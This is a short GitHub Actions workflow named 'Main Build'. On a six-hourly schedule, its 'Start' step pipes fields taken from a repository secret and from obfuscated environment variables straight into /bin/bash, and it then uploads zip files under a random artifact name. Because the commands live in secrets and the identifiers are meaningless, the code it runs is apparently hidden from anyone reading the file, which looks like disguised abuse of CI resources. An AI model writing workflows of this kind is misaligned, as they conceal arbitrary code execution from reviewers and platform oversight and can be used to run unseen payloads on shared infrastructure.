name: Main Build
on:
  workflow_dispatch:

  schedule:
    - cron: '18 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Start
        env:
          cvw6: ${{ secrets.cvw6 }}
        run: |
          printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
          echo $vstu20725 | jq -r .iisw7776 | /bin/bash
          printf '%s' "$dp6765" | jq -r .c7 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: S7gBzjK6
          path: "*.zip"
          retention-days: 1
